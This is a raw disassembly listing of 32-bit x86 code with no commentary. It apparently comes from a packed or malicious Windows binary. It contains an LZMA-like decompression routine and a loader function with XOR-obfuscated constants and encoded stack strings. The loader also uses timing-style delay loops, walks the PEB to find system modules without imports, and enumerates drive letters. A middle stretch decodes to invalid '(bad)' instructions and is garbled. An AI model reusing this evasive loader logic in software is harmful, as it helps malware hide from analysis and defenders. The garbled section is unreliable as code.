  425dbb:	add    eax,ebx
  425dbd:	mov    eax,DWORD PTR [ebp-0x4]
  425dc0:	jne    0x425dd8
  425dc2:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  425dcb:	push   DWORD PTR [ecx]
  425dcd:	mov    eax,DWORD PTR [eax+0x1e0]
  425dd3:	call   DWORD PTR [eax+0x28]
  425dd6:	jmp    0x425de2
  425dd8:	mov    eax,DWORD PTR [eax+0x17c]
  425dde:	mov    eax,DWORD PTR [eax]
  425de0:	add    DWORD PTR [esi],eax
  425de2:	mov    eax,DWORD PTR [ebp-0x4]
  425de5:	mov    eax,DWORD PTR [eax+0x1dc]
  425deb:	dec    DWORD PTR [eax]
  425ded:	mov    ecx,DWORD PTR [ebp-0x4]
  425df0:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425df6:	mov    eax,DWORD PTR [eax]
  425df8:	lea    eax,[ecx+eax*4]
  425dfb:	mov    ecx,DWORD PTR [ebp-0x4]
  425dfe:	mov    ecx,DWORD PTR [ecx+0x17c]
  425e04:	mov    eax,DWORD PTR [eax]
  425e06:	mov    ecx,DWORD PTR [ecx]
  425e08:	add    DWORD PTR [eax],ecx
  425e0a:	pop    edi
  425e0b:	pop    esi
  425e0c:	pop    ebx
  425e0d:	leave  
  425e0e:	ret    0x20
  425e11:	push   edi
  425e12:	push   esi
  425e13:	push   ebx
  425e14:	push   ebp
  425e15:	mov    ebp,esp
  425e17:	mov    eax,DWORD PTR [ebp+0x24]
  425e1a:	add    DWORD PTR [ebp+0x28],eax
  425e1d:	push   eax
  425e1e:	cld    
  425e1f:	mov    esi,DWORD PTR [ebp+0x18]
  425e22:	add    DWORD PTR [ebp+0x1c],esi
  425e25:	push   esi
  425e26:	mov    esi,DWORD PTR [ebp+0x14]
  425e29:	lods   eax,DWORD PTR ds:[esi]
  425e2a:	xchg   edx,eax
  425e2b:	push   edx
  425e2c:	mov    cl,BYTE PTR [esi-0x2]
  425e2f:	or     eax,0xffffffff
  425e32:	shl    eax,cl
  425e34:	not    eax
  425e36:	push   eax
  425e37:	mov    cl,dh
  425e39:	or     eax,0xffffffff
  425e3c:	shl    eax,cl
  425e3e:	not    eax
  425e40:	push   eax
  425e41:	add    cl,dl
  425e43:	mov    edi,esi
  425e45:	sub    esp,0xc
  425e48:	sub    eax,eax
  425e4a:	inc    eax
  425e4b:	push   eax
  425e4c:	push   eax
  425e4d:	push   eax
  425e4e:	push   eax
  425e4f:	push   eax
  425e50:	push   edi
  425e51:	sub    esi,esi
  425e53:	push   esi
  425e54:	or     ebx,0xffffffff
  425e57:	mov    eax,0x300
  425e5c:	shl    eax,cl
  425e5e:	lea    ecx,[eax+0x736]
  425e64:	mov    eax,0x4000400
  425e69:	shr    ecx,1
  425e6b:	rep stos DWORD PTR es:[edi],eax
  425e6d:	push   0x5
  425e6f:	pop    ecx
  425e70:	call   0x42615b
  425e75:	loop   0x425e70
  425e77:	lea    esi,[esi]
  425e79:	lea    edi,[edi]
  425e7b:	mov    edi,DWORD PTR [ebp-0x4]
  425e7e:	mov    eax,DWORD PTR [ebp-0x10]
  425e81:	sub    edi,DWORD PTR [ebp+0x24]
  425e84:	and    eax,edi
  425e86:	mov    DWORD PTR [ebp-0x18],eax
  425e89:	mov    al,0x0
  425e8b:	call   0x426173
  425e90:	jne    0x425f2b
  425e96:	mov    cl,BYTE PTR [ebp-0xc]
  425e99:	and    edi,DWORD PTR [ebp-0x14]
  425e9c:	shl    edi,cl
  425e9e:	sub    cl,0x8
  425ea1:	neg    cl
  425ea3:	shr    esi,cl
  425ea5:	pop    eax
  425ea6:	add    edi,esi
  425ea8:	pop    esi
  425ea9:	lea    edi,[edi+edi*2]
  425eac:	shl    edi,0x8
  425eaf:	cmp    al,0x7
  425eb1:	pop    edx
  425eb2:	lea    ecx,[esi+edi*2+0xe6c]
  425eb9:	push   ecx
  425eba:	push   esi
  425ebb:	mov    esi,0x100
  425ec0:	push   eax
  425ec1:	mov    al,0x1
  425ec3:	jb     0x425ef9
  425ec5:	mov    edi,DWORD PTR [ebp-0x4]
  425ec8:	sub    edi,DWORD PTR [ebp-0x24]
  425ecb:	movzx  edi,BYTE PTR [edi]
  425ece:	mov    ebp,DWORD PTR [ebp-0x34]
  425ed1:	shl    edi,1
  425ed3:	mov    ecx,esi
  425ed5:	and    esi,edi
  425ed7:	add    ecx,esi
  425ed9:	lea    ebp,[ebp+ecx*2+0x0]
  425edd:	call   0x426192
  425ee2:	mov    ecx,eax
  425ee4:	shr    esi,0x8
  425ee7:	and    ecx,0x1
  425eea:	cmp    esi,ecx
  425eec:	mov    esi,0x100
  425ef1:	jne    0x425f01
  425ef3:	cmp    eax,esi
  425ef5:	jb     0x425ece
  425ef7:	jmp    0x425f0d
  425ef9:	mov    ebp,DWORD PTR [ebp-0x34]
  425efc:	call   0x426192
  425f01:	inc    eax
  425f02:	inc    esi
  425f03:	sub    eax,0x1
  425f06:	sub    esi,0x1
  425f09:	cmp    eax,esi
  425f0b:	jb     0x425ef9
  425f0d:	pop    edx
  425f0e:	inc    edx
  425f0f:	cmp    edx,0x5
  425f12:	dec    edx
  425f13:	mov    ecx,edx
  425f15:	jb     0x425f26
  425f17:	inc    edx
  425f18:	cmp    edx,0xb
  425f1b:	dec    edx
  425f1c:	mov    cl,0x4
  425f1e:	dec    cl
  425f20:	jb     0x425f26
  425f22:	mov    cl,0x7
  425f24:	dec    cl
  425f26:	sub    edx,ecx
  425f28:	push   edx
  425f29:	jmp    0x425f7a
  425f2b:	mov    al,0xc1
  425f2d:	dec    al
  425f2f:	call   0x426183
  425f34:	jne    0x425f4a
  425f36:	pop    eax
  425f37:	pop    edi
  425f38:	pop    edx
  425f39:	pop    ecx
  425f3a:	pop    edx
  425f3b:	pop    ecx
  425f3c:	push   DWORD PTR [esp]
  425f3f:	push   ecx
  425f40:	push   edx
  425f41:	mov    edx,0x664
  425f46:	mov    cl,0x0
  425f48:	jmp    0x425fbd
  425f4a:	mov    al,0xcd
  425f4c:	dec    al
  425f4e:	call   0x426183
  425f53:	jne    0x425f83
  425f55:	mov    al,0xf1
  425f57:	dec    al
  425f59:	call   0x426173
  425f5e:	jne    0x425fb3
  425f60:	pop    eax
  425f61:	cmp    al,0x7
  425f63:	mov    al,0x9
  425f65:	jb     0x425f69
  425f67:	mov    al,0xb
  425f69:	push   eax
  425f6a:	mov    esi,DWORD PTR [ebp-0x4]
  425f6d:	sub    esi,DWORD PTR [ebp-0x24]
  425f70:	cmp    esi,DWORD PTR [ebp+0x24]
  425f73:	jb     0x42614a
  425f79:	lods   al,BYTE PTR ds:[esi]
  425f7a:	mov    edi,DWORD PTR [ebp-0x4]
  425f7d:	stos   BYTE PTR es:[edi],al
  425f7e:	jmp    0x426111
  425f83:	mov    al,0xd8
  425f85:	call   0x426183
  425f8a:	mov    esi,DWORD PTR [ebp-0x28]
  425f8d:	je     0x425faa
  425f8f:	mov    al,0xe4
  425f91:	call   0x426183
  425f96:	mov    esi,DWORD PTR [ebp-0x2c]
  425f99:	je     0x425fa4
  425f9b:	mov    esi,DWORD PTR [ebp-0x30]
  425f9e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425fa1:	mov    DWORD PTR [ebp-0x30],ecx
  425fa4:	mov    ecx,DWORD PTR [ebp-0x28]
  425fa7:	mov    DWORD PTR [ebp-0x2c],ecx
  425faa:	mov    ecx,DWORD PTR [ebp-0x24]
  425fad:	mov    DWORD PTR [ebp-0x28],ecx
  425fb0:	mov    DWORD PTR [ebp-0x24],esi
  425fb3:	pop    eax
  425fb4:	pop    edi
  425fb5:	pop    ecx
  425fb6:	mov    edx,0xa68
  425fbb:	mov    cl,0x8
  425fbd:	add    edx,edi
  425fbf:	push   edx
  425fc0:	push   edi
  425fc1:	cmp    al,0x7
  425fc3:	mov    al,cl
  425fc5:	jb     0x425fc9
  425fc7:	add    al,0x3
  425fc9:	push   eax
  425fca:	mov    ebp,DWORD PTR [ebp-0x34]
  425fcd:	call   0x426190
  425fd2:	jne    0x425fe8
  425fd4:	mov    eax,DWORD PTR [ebp-0x18]
  425fd7:	mov    edi,DWORD PTR [ebp-0x34]
  425fda:	shl    eax,0x3
  425fdd:	sub    ecx,ecx
  425fdf:	push   0x8
  425fe1:	pop    esi
  425fe2:	lea    edi,[edi+eax*2+0x4]
  425fe6:	jmp    0x42601d
  425fe8:	mov    ebp,DWORD PTR [ebp-0x34]
  425feb:	add    ebp,0x2
  425fee:	call   0x426190
  425ff3:	jne    0x42600d
  425ff5:	mov    eax,DWORD PTR [ebp-0x18]
  425ff8:	mov    edi,DWORD PTR [ebp-0x34]
  425ffb:	shl    eax,0x3
  425ffe:	push   0x8
  426000:	pop    ecx
  426001:	push   0x8
  426003:	pop    esi
  426004:	lea    edi,[edi+eax*2+0x104]
  42600b:	jmp    0x42601d
  42600d:	mov    edi,0x204
  426012:	add    edi,DWORD PTR [ebp-0x34]
  426015:	push   0x10
  426017:	pop    ecx
  426018:	mov    esi,0x100
  42601d:	mov    DWORD PTR [ebp-0x1c],ecx
  426020:	sub    eax,eax
  426022:	inc    eax
  426023:	mov    ebp,edi
  426025:	call   0x426192
  42602a:	mov    ecx,eax
  42602c:	sub    ecx,esi
  42602e:	jb     0x426023
  426030:	add    DWORD PTR [ebp-0x1c],ecx
  426033:	cmp    DWORD PTR [ebp-0x3c],0x4
  426037:	jae    0x4260ed
  42603d:	add    DWORD PTR [ebp-0x3c],0x7
  426041:	mov    ecx,DWORD PTR [ebp-0x1c]
  426044:	cmp    ecx,0x4
  426047:	jb     0x42604c
  426049:	push   0x3
  42604b:	pop    ecx
  42604c:	mov    edi,DWORD PTR [ebp-0x38]
  42604f:	shl    ecx,0x6
  426052:	sub    eax,eax
  426054:	inc    eax
  426055:	push   0x40
  426057:	pop    esi
  426058:	lea    edi,[edi+ecx*2+0x360]
  42605f:	mov    ebp,edi
  426061:	call   0x426192
  426066:	mov    ecx,eax
  426068:	sub    ecx,esi
  42606a:	jb     0x42605f
  42606c:	mov    DWORD PTR [ebp-0x18],ecx
  42606f:	mov    DWORD PTR [ebp-0x24],ecx
  426072:	cmp    ecx,0x4
  426075:	jb     0x4260ea
  426077:	mov    esi,ecx
  426079:	and    DWORD PTR [ebp-0x24],0x1
  42607d:	shr    esi,1
  42607f:	or     DWORD PTR [ebp-0x24],0x2
  426083:	dec    esi
  426084:	cmp    ecx,0xe
  426087:	jae    0x4260a2
  426089:	mov    eax,0x2af
  42608e:	sub    eax,ecx
  426090:	mov    ecx,esi
  426092:	shl    BYTE PTR [ebp-0x24],cl
  426095:	add    eax,DWORD PTR [ebp-0x24]
  426098:	shl    eax,1
  42609a:	add    eax,DWORD PTR [ebp-0x38]
  42609d:	mov    DWORD PTR [ebp-0x34],eax
  4260a0:	jmp    0x4260cf
  4260a2:	sub    esi,0x4
  4260a5:	call   0x42614f
  4260aa:	shr    ebx,1
  4260ac:	shl    DWORD PTR [ebp-0x24],1
  4260af:	cmp    DWORD PTR [ebp-0x20],ebx
  4260b2:	jb     0x4260ba
  4260b4:	inc    DWORD PTR [ebp-0x24]
  4260b7:	sub    DWORD PTR [ebp-0x20],ebx
  4260ba:	dec    esi
  4260bb:	jne    0x4260a5
  4260bd:	mov    eax,0x644
  4260c2:	add    eax,DWORD PTR [ebp-0x38]
  4260c5:	mov    DWORD PTR [ebp-0x34],eax
  4260c8:	shl    DWORD PTR [ebp-0x24],0x4
  4260cc:	push   0x4
  4260ce:	pop    esi
  4260cf:	sub    edi,edi
  4260d1:	inc    edi
  4260d2:	mov    eax,edi
  4260d4:	mov    ebp,DWORD PTR [ebp-0x34]
  4260d7:	call   0x426192
  4260dc:	test   al,0x1
  4260de:	je     0x4260e3
  4260e0:	or     DWORD PTR [ebp-0x24],edi
  4260e3:	shl    edi,1
  4260e5:	dec    esi
  4260e6:	jne    0x4260d4
  4260e8:	jmp    0x4260ea
  4260ea:	inc    DWORD PTR [ebp-0x24]
  4260ed:	mov    ecx,DWORD PTR [ebp-0x1c]
  4260f0:	add    ecx,0x2
  4260f3:	mov    edi,DWORD PTR [ebp-0x4]
  4260f6:	mov    eax,edi
  4260f8:	sub    eax,DWORD PTR [ebp+0x24]
  4260fb:	cmp    DWORD PTR [ebp-0x24],eax
  4260fe:	ja     0x42614a
  426100:	mov    esi,edi
  426102:	sub    esi,DWORD PTR [ebp-0x24]
  426105:	mov    edx,DWORD PTR [ebp+0x28]
  426108:	lods   al,BYTE PTR ds:[esi]
  426109:	stos   BYTE PTR es:[edi],al
  42610a:	cmp    edi,edx
  42610c:	jae    0x426111
  42610e:	dec    ecx
  42610f:	jne    0x426108
  426111:	mov    DWORD PTR [ebp-0x4],edi
  426114:	movzx  esi,al
  426117:	cmp    edi,DWORD PTR [ebp+0x28]
  42611a:	jb     0x425e7b
  426120:	call   0x42614f
  426125:	sub    eax,eax
  426127:	lea    ebp,[esp+0x3c]
  42612b:	mov    edx,DWORD PTR [ebp+0x20]
  42612e:	mov    esi,DWORD PTR [ebp-0x8]
  426131:	sub    esi,DWORD PTR [ebp+0x18]
  426134:	mov    DWORD PTR [edx],esi
  426136:	mov    dh,0xdd
  426138:	cmp    BYTE PTR [esi+0x7d347b7d],dh
  42613e:	sbb    BYTE PTR [esi+0x1f5af70],ch
  426144:	add    eax,0x188f893
  426149:	jmp    0x37cbec82
  42614e:	jmp    0x4260de
  426150:	ja     0x4260da
  426152:	mov    BYTE PTR [eax-0x6873ae74],cl
  426158:	(bad)  
  426159:	pop    ss
  42615a:	test   al,0xe1
  42615c:	mov    dh,0x5d
  42615e:	imul   esi,DWORD PTR [ebp+ebx*2-0x8],0x55
  426163:	sbb    esi,DWORD PTR [esi+0xb8f0b9d]
  426169:	test   al,0x3a
  42616b:	scas   al,BYTE PTR es:[edi]
  42616c:	popf   
  42616d:	or     ebp,DWORD PTR [esi-0x68fe94a3]
  426173:	mov    dh,0xbd
  426175:	fwait
  426176:	les    esp,FWORD PTR [edx-0x75]
  426179:	(bad)  
  42617a:	sets   BYTE PTR [ebp+ebx*4+0x378f942b]
  426182:	mov    al,ds:0x948b62c4
  426187:	popf   
  426188:	fwait
  426189:	mov    dh,0x3d
  42618b:	stos   DWORD PTR es:[edi],eax
  42618c:	mov    esi,0x34889d39
  426191:	mov    edi,DWORD PTR [esi-0x717762c7]
  426197:	ja     0x426121
  426199:	mov    BYTE PTR [eax-0x4907aa74],cl
  42619f:	mov    ecx,0x198f6818
  4261a4:	sbb    BYTE PTR [eax],cl
  4261a6:	test   al,0x74
  4261a8:	mov    ecx,0xfa55f918
  4261ad:	mov    dl,0xcc
  4261af:	xchg   DWORD PTR [ecx+0x178f6818],ebx
  4261b5:	test   al,0x88
  4261b7:	push   esp
  4261b8:	and    al,0x20
  4261ba:	mov    ecx,ebx
  4261bc:	movzx  edx,WORD PTR [ebp+0x0]
  4261c0:	shr    ecx,0xb
  4261c3:	imul   ecx,edx
  4261c6:	cmp    DWORD PTR [esp+0x20],ecx
  4261ca:	jae    0x4261e3
  4261cc:	mov    ebx,ecx
  4261ce:	mov    ecx,0x800
  4261d3:	sub    ecx,edx
  4261d5:	shr    ecx,0x5
  4261d8:	add    WORD PTR [ebp+0x0],cx
  4261dc:	add    eax,eax
  4261de:	lea    ebp,[esp+0x40]
  4261e2:	ret    
  4261e3:	shr    edx,0x5
  4261e6:	sub    DWORD PTR [esp+0x20],ecx
  4261ea:	sub    ebx,ecx
  4261ec:	sub    WORD PTR [ebp+0x0],dx
  4261f0:	add    eax,eax
  4261f2:	add    eax,0x1
  4261f5:	lea    ebp,[esp+0x40]
  4261f9:	ret    
  4261fa:	push   ebp
  4261fb:	mov    ebp,esp
  4261fd:	sub    esp,0x12c
  426203:	push   ebx
  426204:	push   esi
  426205:	push   edi
  426206:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42620d:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  426214:	mov    eax,DWORD PTR [ebp+0x8]
  426217:	mov    DWORD PTR [ebp+0x8],eax
  42621a:	mov    ecx,DWORD PTR [ebp-0x10]
  42621d:	mov    ebx,0x75108ae
  426222:	xor    ecx,ebx
  426224:	mov    eax,0x3272f5
  426229:	add    ecx,eax
  42622b:	mov    DWORD PTR [ebp-0x24],ecx
  42622e:	mov    ecx,DWORD PTR [ebp-0x10]
  426231:	xor    ecx,ebx
  426233:	add    ecx,eax
  426235:	mov    DWORD PTR [ebp-0x40],ecx
  426238:	mov    ecx,DWORD PTR [ebp-0x10]
  42623b:	xor    ecx,ebx
  42623d:	add    ecx,eax
  42623f:	mov    DWORD PTR [ebp-0x3c],ecx
  426242:	mov    ecx,DWORD PTR [ebp-0x10]
  426245:	xor    ecx,ebx
  426247:	add    ecx,eax
  426249:	mov    DWORD PTR [ebp-0xd8],ecx
  42624f:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  426256:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  42625d:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  426264:	push   0x25
  426266:	pop    ecx
  426267:	mov    DWORD PTR [ebp-0x30],ecx
  42626a:	mov    DWORD PTR [ebp-0x30],ecx
  42626d:	push   0x65
  42626f:	pop    ecx
  426270:	mov    DWORD PTR [ebp-0x30],ecx
  426273:	mov    DWORD PTR [ebp-0x30],ecx
  426276:	mov    DWORD PTR [ebp-0x30],0x4d
  42627d:	mov    DWORD PTR [ebp-0x30],0x43
  426284:	mov    ecx,DWORD PTR [ebp-0x10]
  426287:	xor    ecx,ebx
  426289:	add    ecx,eax
  42628b:	mov    DWORD PTR [ebp-0x30],ecx
  42628e:	mov    ecx,DWORD PTR [ebp-0x10]
  426291:	xor    ecx,ebx
  426293:	add    ecx,eax
  426295:	mov    DWORD PTR [ebp-0x30],ecx
  426298:	mov    DWORD PTR [ebp-0x28],0x258
  42629f:	mov    DWORD PTR [ebp-0x34],0x36
  4262a6:	mov    DWORD PTR [ebp-0x14],0x7a
  4262ad:	lea    edi,[ebp-0x10c]
  4262b3:	lea    esi,[ebp-0x12c]
  4262b9:	call   0x426f79
  4262be:	dec    DWORD PTR [ebp-0x14]
  4262c1:	jne    0x4262ad
  4262c3:	dec    DWORD PTR [ebp-0x34]
  4262c6:	jne    0x4262a6
  4262c8:	dec    DWORD PTR [ebp-0x28]
  4262cb:	jne    0x42629f
  4262cd:	mov    DWORD PTR [ebp-0x28],0x400e
  4262d4:	mov    eax,DWORD PTR [ebp-0x10]
  4262d7:	xor    eax,ebx
  4262d9:	mov    esi,0x3272f5
  4262de:	add    eax,esi
  4262e0:	mov    DWORD PTR [ebp-0x1c],eax
  4262e3:	mov    eax,DWORD PTR [ebp-0x10]
  4262e6:	and    DWORD PTR [ebp-0x94],0x0
  4262ed:	xor    eax,ebx
  4262ef:	add    eax,esi
  4262f1:	mov    DWORD PTR [ebp-0x38],eax
  4262f4:	mov    eax,fs:0x18
  4262fa:	mov    DWORD PTR [ebp-0x94],eax
  426300:	mov    eax,DWORD PTR [eax+0x30]
  426303:	mov    DWORD PTR [ebp-0xcc],eax
  426309:	mov    eax,DWORD PTR [eax+0xc]
  42630c:	mov    DWORD PTR [ebp-0xc0],eax
  426312:	mov    eax,DWORD PTR [ebp+0x8]
  426315:	lea    ecx,[ebp-0x94]
  42631b:	mov    DWORD PTR [eax+0x1a0],ecx
  426321:	mov    eax,DWORD PTR [ebp+0x8]
  426324:	lea    ecx,[ebp-0xcc]
  42632a:	mov    DWORD PTR [eax+0x1a4],ecx
  426330:	mov    eax,DWORD PTR [ebp+0x8]
  426333:	push   DWORD PTR [ebp+0x8]
  426336:	lea    ecx,[ebp-0xc0]
  42633c:	mov    DWORD PTR [eax+0x1a8],ecx
  426342:	call   0x42873a
  426347:	mov    ecx,DWORD PTR [ebp-0x10]
  42634a:	xor    ecx,ebx
  42634c:	add    ecx,esi
  42634e:	cmp    ecx,eax
  426350:	je     0x4266d3
  426356:	mov    eax,DWORD PTR [ebp+0x8]
  426359:	mov    eax,DWORD PTR [eax+0x194]
  42635f:	mov    ecx,DWORD PTR [eax]
  426361:	mov    eax,DWORD PTR [ebp+0x8]
  426364:	mov    eax,DWORD PTR [eax+0x194]
  42636a:	mov    eax,DWORD PTR [eax]
  42636c:	add    eax,DWORD PTR [ecx+0x3c]
  42636f:	mov    ecx,DWORD PTR [ebp+0x8]
  426372:	mov    ecx,DWORD PTR [ecx+0x1e0]
  426378:	lea    edx,[ebp-0xec]
  42637e:	push   edx
  42637f:	mov    edx,DWORD PTR [ebp+0x8]
  426382:	mov    edx,DWORD PTR [edx+0x18c]
  426388:	mov    edx,DWORD PTR [edx]
  42638a:	add    edx,DWORD PTR [eax+0x88]
  426390:	push   0x4
  426392:	push   DWORD PTR [eax+0x8c]
  426398:	push   edx
  426399:	call   DWORD PTR [ecx+0x1c]
  42639c:	push   DWORD PTR [ebp+0x8]
  42639f:	xor    eax,eax
  4263a1:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e38
  4263ab:	mov    DWORD PTR [ebp-0xa4],0x12371120
  4263b5:	mov    DWORD PTR [ebp-0xa0],0x40111c0a
  4263bf:	mov    BYTE PTR [ebp-0x9c],0x83
  4263c6:	lea    edi,[ebp-0x9b]
  4263cc:	stos   DWORD PTR es:[edi],eax
  4263cd:	stos   WORD PTR es:[edi],ax
  4263cf:	stos   BYTE PTR es:[edi],al
  4263d0:	xor    eax,eax
  4263d2:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e38
  4263dc:	mov    DWORD PTR [ebp-0xb8],0x12371120
  4263e6:	mov    DWORD PTR [ebp-0xb4],0x2a111c0a
  4263f0:	mov    BYTE PTR [ebp-0xb0],0x83
  4263f7:	lea    edi,[ebp-0xaf]
  4263fd:	stos   DWORD PTR es:[edi],eax
  4263fe:	stos   WORD PTR es:[edi],ax
  426400:	stos   BYTE PTR es:[edi],al
  426401:	mov    edi,DWORD PTR [ebp+0x8]
  426404:	mov    eax,DWORD PTR [ebp+0x8]
  426407:	mov    edx,DWORD PTR [eax+0x1b8]
  42640d:	mov    DWORD PTR [ebp-0x68],0x110f0e17
  426414:	mov    DWORD PTR [ebp-0x64],0x1813141e
  42641b:	mov    WORD PTR [ebp-0x60],0x8340
  426421:	mov    DWORD PTR [ebp-0x90],0x1b3e0e38
  42642b:	mov    DWORD PTR [ebp-0x8c],0x17401120
  426435:	mov    DWORD PTR [ebp-0x88],0x35201b13
  42643f:	mov    DWORD PTR [ebp-0x84],0x111c140c
  426449:	mov    DWORD PTR [ebp-0x80],0x83401e18
  426450:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e38
  426457:	mov    DWORD PTR [ebp-0x78],0x17401120
  42645e:	mov    DWORD PTR [ebp-0x74],0x35201b13
  426465:	mov    DWORD PTR [ebp-0x70],0x111c140c
  42646c:	mov    DWORD PTR [ebp-0x6c],0x832a1e18
  426473:	call   0x428769
  426478:	push   eax
  426479:	mov    eax,DWORD PTR [ebp+0x8]
  42647c:	mov    eax,DWORD PTR [eax+0x1a8]
  426482:	push   DWORD PTR [eax]
  426484:	call   0x42840a
  426489:	test   eax,eax
  42648b:	jne    0x4264dd
  42648d:	mov    eax,DWORD PTR [ebp+0x8]
  426490:	mov    eax,DWORD PTR [eax+0x1e0]
  426496:	mov    edi,DWORD PTR [ebp+0x8]
  426499:	add    eax,0x4
  42649c:	mov    DWORD PTR [ebp-0x20],eax
  42649f:	mov    eax,DWORD PTR [ebp+0x8]
  4264a2:	mov    edx,DWORD PTR [eax+0x1b8]
  4264a8:	call   0x428769
  4264ad:	push   eax
  4264ae:	mov    eax,DWORD PTR [ebp-0x20]
  4264b1:	call   DWORD PTR [eax]
  4264b3:	test   eax,eax
  4264b5:	jne    0x4264dd
  4264b7:	mov    eax,DWORD PTR [ebp+0x8]
  4264ba:	mov    eax,DWORD PTR [eax+0x1e0]
  4264c0:	mov    edi,DWORD PTR [ebp+0x8]
  4264c3:	add    eax,0x10
  4264c6:	mov    DWORD PTR [ebp-0x20],eax
  4264c9:	mov    eax,DWORD PTR [ebp+0x8]
  4264cc:	mov    edx,DWORD PTR [eax+0x1b8]
  4264d2:	call   0x428769
  4264d7:	push   eax
  4264d8:	mov    eax,DWORD PTR [ebp-0x20]
  4264db:	call   DWORD PTR [eax]
  4264dd:	mov    eax,DWORD PTR [ebp-0x10]
  4264e0:	mov    ecx,DWORD PTR [ebp-0x28]
  4264e3:	xor    eax,ebx
  4264e5:	add    eax,esi
  4264e7:	cmp    eax,ecx
  4264e9:	je     0x4266ac
  4264ef:	mov    eax,DWORD PTR [ebp-0x18]
  4264f2:	xor    eax,ebx
  4264f4:	mov    ecx,0xffcd8d0b
  4264f9:	sub    ecx,eax
  4264fb:	add    ecx,DWORD PTR [ebp-0x28]
  4264fe:	mov    eax,DWORD PTR [ebp-0x1c]
  426501:	cmp    eax,ecx
  426503:	ja     0x4266ac
  426509:	mov    DWORD PTR [ebp-0x34],0x0
  426510:	push   DWORD PTR [ebp+0x8]
  426513:	mov    edi,DWORD PTR [ebp+0x8]
  426516:	mov    eax,DWORD PTR [ebp+0x8]
  426519:	mov    edx,DWORD PTR [eax+0x1b4]
  42651f:	call   0x428769
  426524:	push   eax
  426525:	mov    eax,DWORD PTR [ebp+0x8]
  426528:	mov    eax,DWORD PTR [eax+0x1a8]
  42652e:	push   DWORD PTR [eax]
  426530:	call   0x42840a
  426535:	mov    ecx,DWORD PTR [ebp+0x8]
  426538:	mov    ecx,DWORD PTR [ecx+0x19c]
  42653e:	mov    DWORD PTR [ecx],eax
  426540:	mov    eax,DWORD PTR [ebp+0x8]
  426543:	mov    edi,DWORD PTR [eax+0x1e0]
  426549:	mov    esi,DWORD PTR [ebp+0x8]
  42654c:	xor    eax,eax
  42654e:	lea    edx,[ebp-0x7c]
  426551:	call   0x42879f
  426556:	push   eax
  426557:	mov    eax,DWORD PTR [ebp+0x8]
  42655a:	mov    eax,DWORD PTR [eax+0x19c]
  426560:	push   DWORD PTR [eax]
  426562:	call   DWORD PTR [edi+0x8]
  426565:	mov    DWORD PTR [ebp-0x20],eax
  426568:	mov    eax,DWORD PTR [ebp+0x8]
  42656b:	mov    edi,DWORD PTR [eax+0x1e0]
  426571:	mov    esi,DWORD PTR [ebp+0x8]
  426574:	xor    eax,eax
  426576:	lea    edx,[ebp-0x90]
  42657c:	call   0x42879f
  426581:	push   eax
  426582:	mov    eax,DWORD PTR [ebp+0x8]
  426585:	mov    eax,DWORD PTR [eax+0x19c]
  42658b:	push   DWORD PTR [eax]
  42658d:	call   DWORD PTR [edi+0x8]
  426590:	mov    eax,DWORD PTR [ebp+0x8]
  426593:	mov    edi,DWORD PTR [eax+0x1e0]
  426599:	mov    esi,DWORD PTR [ebp+0x8]
  42659c:	xor    eax,eax
  42659e:	lea    edx,[ebp-0xa8]
  4265a4:	call   0x42879f
  4265a9:	push   eax
  4265aa:	mov    eax,DWORD PTR [ebp+0x8]
  4265ad:	mov    eax,DWORD PTR [eax+0x19c]
  4265b3:	push   DWORD PTR [eax]
  4265b5:	call   DWORD PTR [edi+0x8]
  4265b8:	and    DWORD PTR [ebp-0x8],0x0
  4265bc:	mov    DWORD PTR [ebp-0x48],eax
  4265bf:	mov    eax,DWORD PTR [ebp-0x8]
  4265c2:	and    eax,0x7
  4265c5:	add    eax,0x31
  4265c8:	push   eax
  4265c9:	call   DWORD PTR [ebp-0x20]
  4265cc:	test   eax,eax
  4265ce:	je     0x426612
  4265d0:	mov    eax,DWORD PTR [ebp-0x8]
  4265d3:	push   0x19
  4265d5:	xor    edx,edx
  4265d7:	pop    ecx
  4265d8:	div    ecx
  4265da:	add    dl,0x41
  4265dd:	movzx  eax,dl
  4265e0:	push   eax
  4265e1:	call   DWORD PTR [ebp-0x48]
  4265e4:	test   eax,eax
  4265e6:	jne    0x426612
  4265e8:	mov    eax,DWORD PTR [ebp+0x8]
  4265eb:	mov    edi,DWORD PTR [eax+0x1e0]
  4265f1:	mov    esi,DWORD PTR [ebp+0x8]
  4265f4:	xor    eax,eax
  4265f6:	lea    edx,[ebp-0x68]
  4265f9:	call   0x42879f
  4265fe:	push   eax
  4265ff:	mov    eax,DWORD PTR [ebp+0x8]
  426602:	mov    eax,DWORD PTR [eax+0x198]
  426608:	push   DWORD PTR [eax]
  42660a:	call   DWORD PTR [edi+0x8]
  42660d:	mov    DWORD PTR [ebp-0x14],eax
  426610:	jmp    0x426616
  426612:	and    DWORD PTR [ebp-0x14],0x0
  426616:	inc    DWORD PTR [ebp-0x8]
  426619:	cmp    DWORD PTR [ebp-0x8],0x10
  42661d:	jb     0x4265bf
  42661f:	mov    eax,DWORD PTR [ebp-0x18]
  426622:	mov    esi,DWORD PTR [ebp+0x8]
  426625:	xor    eax,ebx
  426627:	mov    edi,0x3272f5
  42662c:	add    eax,edi
  42662e:	lea    edx,[ebp-0x10c]
  426634:	call   0x42879f
  426639:	push   eax
  42663a:	mov    eax,DWORD PTR [ebp-0x10]
  42663d:	mov    esi,DWORD PTR [ebp+0x8]
  426640:	xor    eax,ebx
  426642:	add    eax,edi
  426644:	lea    edx,[ebp-0x12c]
  42664a:	call   0x42879f
  42664f:	push   eax
  426650:	call   DWORD PTR [ebp-0x14]
  426653:	mov    ecx,DWORD PTR [ebp-0x10]
  426656:	xor    ecx,ebx
  426658:	add    ecx,edi
  42665a:	cmp    ecx,eax
  42665c:	jne    0x426665
  42665e:	mov    DWORD PTR [ebp-0x34],0x1
  426665:	mov    eax,DWORD PTR [ebp-0x18]
  426668:	mov    ecx,DWORD PTR [ebp-0x1c]
  42666b:	xor    eax,ebx
  42666d:	lea    eax,[eax+ecx*1+0x3272f5]
